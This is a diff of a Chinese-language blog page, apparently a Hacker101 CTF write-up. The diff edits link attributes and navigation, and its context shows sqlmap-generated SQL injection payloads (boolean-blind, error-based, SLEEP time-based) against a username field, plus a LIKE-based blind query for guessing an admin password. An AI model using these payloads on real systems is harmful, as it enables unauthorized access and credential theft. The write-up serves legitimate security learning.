@@ -174,7 +174,7 @@
 <p>然后得到的这个结果</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Parameter: username (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</span><br><span class="line">    Payload: username=&apos; OR NOT 1504=1504#&amp;password=</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: username=&apos; AND (SELECT 1816 FROM(SELECT COUNT(*),CONCAT(0x7162716271,(SELECT (ELT(1816=1816,1))),0x71707a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TMjy&amp;password=</span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind</span><br><span class="line">    Payload: username=&apos; OR SLEEP(5)-- UXmq&amp;password=</span><br></pre></td></tr></table></figure>
 <p>比如我们这个样注入一条<code>&#39; or 1=1#</code>，第一个引号终止了原来的用户名，#表示注释掉后面的冒号，用来输入一个<code>1=1</code>的True的结果。但是得到的结果仍然是unknown user，这个时候在回头看python那个cur的函数，发现应该是这个函数来得到的布尔值，而不是里面的参数。</p>
-<p>这里引入一下<a href="https://www.owasp.org/index.php/Blind_SQL_Injection" target="_blank" rel="noopener">Blind SQL Injection</a> 来寻找有效的数据库的值。</p>
+<p>这里引入一下<a href="https://www.owasp.org/index.php/Blind_SQL_Injection" target="_blank" rel="external">Blind SQL Injection</a> 来寻找有效的数据库的值。</p>
 <p>定一个查询函数使用<code>LIKE</code>，我们就可以匹配有效的密码。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;SELECT password FROM admins WHERE username=&apos; &apos; or password LIKE &quot;%x&quot;#</span><br></pre></td></tr></table></figure>
 <p><code>%</code>在这里表示字符的数量，包括0。x是一个从小写a-z和大写A-Z以及数字0里面的字符。查询x是否在里面。但是我们注意到%也是过滤器，被后面的replace函数过滤掉了。所以查询函数被清理成:</p>
@@ -196,14 +196,14 @@
     
     <nav id="gobottom" class="pagination">
         
-        <a class="prev-post" title="How to use XSS" href="/2018/12/17/[hack]-XSS/">
-            ← How to use XSS
+        <a class="prev-post" title="Hacker101 CTF-1/2" href="/2018/12/12/[hack]-hacker101-1/">
+            ← Hacker101 CTF-1/2
         </a>
         
         <span class="prev-next-post">·</span>
         
-        <a class="next-post" title="Hacker101 CTF-1/2" href="/2018/12/12/[hack]-hacker101-1/">
-            Hacker101 CTF-1/2 →
+        <a class="next-post" title="How to use XSS" href="/2018/12/17/[hack]-XSS/">
+            How to use XSS →
         </a>
         
     </nav>
@@ -384,8 +384,8 @@
 		</div>
 		<nav class="site-footer-nav">
 			
-			<a href="https://hexo.io" title="Hexo" target="_blank" rel="noopener">Hexo</a>
-			<a href="https://github.com/xzhih/hexo-theme-casper" title="Casper" target="_blank" rel="noopener">Casper</a>
+			<a href="https://hexo.io" title="Hexo" target="_blank" rel="external">Hexo</a>
+			<a href="https://github.com/xzhih/hexo-theme-casper" title="Casper" target="_blank" rel="external">Casper</a>
 		</nav>
 	</div>
 </footer>
